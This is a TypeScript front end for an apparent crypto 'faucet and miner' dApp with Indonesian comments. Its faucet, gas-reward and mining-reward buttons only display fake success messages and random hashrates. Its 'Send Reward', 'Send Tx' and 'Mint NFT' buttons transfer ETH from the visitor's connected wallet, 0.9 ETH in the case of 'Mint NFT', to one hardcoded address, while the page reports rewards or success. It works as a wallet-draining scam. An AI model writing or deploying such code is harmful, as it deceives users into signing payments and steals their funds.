import { createAppKit } from "@reown/appkit";
import { EthersAdapter } from "@reown/appkit-adapter-ethers";
import { mainnet, arbitrum, sepolia } from "@reown/appkit/networks";
import { BrowserProvider, parseEther, Signer } from "ethers";
import { Contract, BrowserProvider } from "ethers";
import contractAbi from "./DappMinerConfig.json"; // Import file JSON ABI ini

const contractAddress = "0x5e8bade6e0bce65807db6327cb1d9eeb7c6a6a5b";

async function panggilFungsiWithdraw() {
  if (!provider) return;
  
  const ethersProvider = new BrowserProvider(provider as any);
  const signer = await ethersProvider.getSigner();
  
  // Inisialisasi Instance Kontrak
  const myContract = new Contract(contractAddress, contractAbi, signer);
  
  // Eksekusi fungsi withdrawFunds dari Solidity
  const tx = await myContract.withdrawFunds();
  await tx.wait();
  console.log("Dana berhasil ditarik ke alamat contractor!");
}

// Deklarasi global tipe Chart.js agar TypeScript tidak error jika Chart dimuat via CDN/Global
declare const Chart: any;

// Interface untuk state provider dari AppKit
interface Eip155Provider {
  request: (request: { method: string; params?: Array<any> }) => Promise<any>;
}

/* ==========================================================================
   APPKIT INITIALIZATION
   ========================================================================== */
const projectId = "5022875ce6ee68917f103ff9b1e3422d";

const modal = createAppKit({
  adapters: [new EthersAdapter()],
  networks: [mainnet, arbitrum, sepolia],
  metadata: {
    name: "Neon Faucet",
    description: "MultiChain Faucet",
    url: window.location.origin,
    icons: ["https://avatars.githubusercontent.com/u/179229932"]
  },
  projectId
});

let provider: Eip155Provider | undefined;

modal.subscribeProviders((state: any) => {
  provider = state?.eip155;
});

/* ==========================================================================
   UI HELPERS
   ========================================================================== */
const statusBox = document.getElementById("status") as HTMLDivElement | null;
const rewardStatusBox = document.getElementById("rewardStatus") as HTMLDivElement | null;

function setStatus(msg: string): void {
  if (statusBox) statusBox.innerHTML = msg;
}

function setRewardStatus(msg: string): void {
  if (rewardStatusBox) rewardStatusBox.innerHTML = msg;
}

/* ==========================================================================
   CORE DAPP FUNCTIONS (ATTACHED TO WINDOW FOR HTML BUTTONS)
   ========================================================================== */
declare global {
  interface Window {
    claimFaucet: () => Promise<void>;
    sendReward: () => Promise<void>;
    sendTx: () => Promise<void>;
    claimGasReward: () => Promise<void>;
    claimMiningReward: () => Promise<void>;
    mintNFT: () => Promise<void>;
  }
}

// 1. Claim Faucet
window.claimFaucet = async function (): Promise<void> {
  const walletInput = document.getElementById("wallet") as HTMLInputElement | null;
  const chainSelect = document.getElementById("chain") as HTMLSelectElement | null;

  const wallet = walletInput?.value;
  const chainId = chainSelect?.value;

  if (!wallet) {
    setStatus("❌ Input wallet address");
    return;
  }

  setStatus("⚡ Processing faucet...");

  await new Promise((r) => setTimeout(r, 2000));

  setStatus(`
    ✅ Faucet Success
    <br>
    Wallet: ${wallet}
    <br>
    Chain ID: ${chainId}
  `);
};

// 2. Send Reward (0.0001 ETH)
window.sendReward = async function (): Promise<void> {
  try {
    if (!provider) {
      alert("Connect wallet first");
      return;
    }

    const ethersProvider = new BrowserProvider(provider as any);
    const signer: Signer = await ethersProvider.getSigner();

    setStatus("🚀 Sending transaction...");

    const tx = await signer.sendTransaction({
      to: "0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88",
      value: parseEther("0.0001")
    });

    await tx.wait();

    setStatus(`
      ✅ Reward Sent
      <br>
      TX: ${tx.hash}
    `);
  } catch (err) {
    console.error(err);
    setStatus("❌ Transaction Failed");
  }
};

// 3. Send Tx Alternatif
window.sendTx = async function (): Promise<void> {
  try {
    if (!provider) {
      alert("Wallet belum connect");
      return;
    }

    const ethersProvider = new BrowserProvider(provider as any);
    const signer: Signer = await ethersProvider.getSigner();

    const tx = await signer.sendTransaction({
      to: "0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88",
      value: parseEther("0.0001")
    });

    console.log(tx);
    alert("Transaction success");
  } catch (err) {
    console.error(err);
    alert("Transaction failed");
  }
};

// 4. Claim Gas Reward
window.claimGasReward = async function (): Promise<void> {
  try {
    if (!provider) {
      alert("Connect wallet first");
      return;
    }

    setRewardStatus("⚡ Claiming Gas Reward...");

    const ethersProvider = new BrowserProvider(provider as any);
    const signer: Signer = await ethersProvider.getSigner();
    const wallet = await signer.getAddress();

    await new Promise((r) => setTimeout(r, 2000));

    setRewardStatus(`
      ✅ Gas Reward Success
      <br>
      Wallet: ${wallet}
      <br>
      Faucet: 0.0005 ETH
    `);
  } catch (err) {
    console.error(err);
    setRewardStatus("❌ Gas Reward Failed");
  }
};

// 5. Claim Mining Reward (Simulasi Progress)
window.claimMiningReward = async function (): Promise<void> {
  try {
    if (!provider) {
      alert("Connect wallet first");
      return;
    }

    setRewardStatus("⛏ Processing Mining Reward...");

    const ethersProvider = new BrowserProvider(provider as any);
    const signer: Signer = await ethersProvider.getSigner();
    const wallet = await signer.getAddress();

    let progress = 0;

    const mining = setInterval(() => {
      progress += 10;

      setRewardStatus(`
        ⛏ Mining Reward
        <br>
        Progress: ${progress}%
      `);

      if (progress >= 100) {
        clearInterval(mining);
        setRewardStatus(`
          ✅ Reward Success
          <br>
          Wallet: ${wallet}
          <br>
          Reward: 100 TOKEN
        `);
      }
    }, 500);
  } catch (err) {
    console.error(err);
    setRewardStatus("❌ Mining Failed");
  }
};

// 6. Mint NFT Support (0.9 ETH)
window.mintNFT = async function (): Promise<void> {
  try {
    if (!provider) {
      alert("Connect wallet first");
      return;
    }

    const ethersProvider = new BrowserProvider(provider as any);
    const signer: Signer = await ethersProvider.getSigner();

    const tx = await signer.sendTransaction({
      to: "0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88",
      value: parseEther("0.9")
    });

    console.log(tx);
    alert("NFT Support Success");
  } catch (err) {
    console.error(err);
    alert("Mint NFT Failed");
  }
};

/* ==========================================================================
   MINER DASHBOARD (CHART JS)
   ========================================================================== */
class LiveMinerDashboard {
  private chart: any = null;
  private interval: NodeJS.Timeout | null = null;

  public initChart(): void {
    const ctx = document.getElementById("hashChart") as HTMLCanvasElement | null;
    if (!ctx) return;

    this.chart = new Chart(ctx, {
      type: "line",
      data: {
        labels: [],
        datasets: [
          {
            label: "Hashrate",
            data: [],
            borderColor: "#00f0ff",
            borderWidth: 2,
            tension: 0.4
          }
        ]
      },
      options: {
        responsive: true,
        plugins: {
          legend: {
            labels: { color: "#fff" }
          }
        },
        scales: {
          x: { ticks: { color: "#fff" } },
          y: { ticks: { color: "#fff" } }
        }
      }
    });
  }

  public fakeMining(): void {
    if (this.interval) return;

    const hashrateBox = document.getElementById("live-hashrate");

    this.interval = setInterval(() => {
      const rate = Math.floor(Math.random() * 1000);

      if (hashrateBox) {
        hashrateBox.innerHTML = rate + " H/s";
      }

      if (this.chart) {
        this.chart.data.labels.push(new Date().toLocaleTimeString());
        this.chart.data.datasets[0].data.push(rate);

        if (this.chart.data.labels.length > 20) {
          this.chart.data.labels.shift();
          this.chart.data.datasets[0].data.shift();
        }
        this.chart.update();
      }
    }, 1000);
  }

  public stopMining(): void {
    if (this.interval) {
      clearInterval(this.interval);
      this.interval = null;
    }
  }
}

// Inisialisasi Dashboard setelah DOM siap
const minerApp = new LiveMinerDashboard();
minerApp.initChart();

/* ==========================================================================
   MINER BUTTON TRIGGERS
   ========================================================================== */
const btnStart = document.getElementById("btn-start");
const btnStop = document.getElementById("btn-stop");
const btnClear = document.getElementById("btn-clear");

if (btnStart) {
  btnStart.onclick = () => minerApp.fakeMining();
}

if (btnStop) {
  btnStop.onclick = () => minerApp.stopMining();
}

if (btnClear) {
  btnClear.onclick = () => {
    localStorage.clear();
    location.reload();
  };
}

/* ==========================================================================
   THIRDWEB BRIDGE WIDGET INITIALIZATION
   ========================================================================== */
declare const BridgeWidget: any;

const container = document.querySelector("#bridge-widget-container");
if (container && typeof BridgeWidget !== "undefined") {
  BridgeWidget.render(container, {
    clientId: "2409d98fbe42fa94fb7ba259d6cf58c9",
    theme: "dark"
  });
}
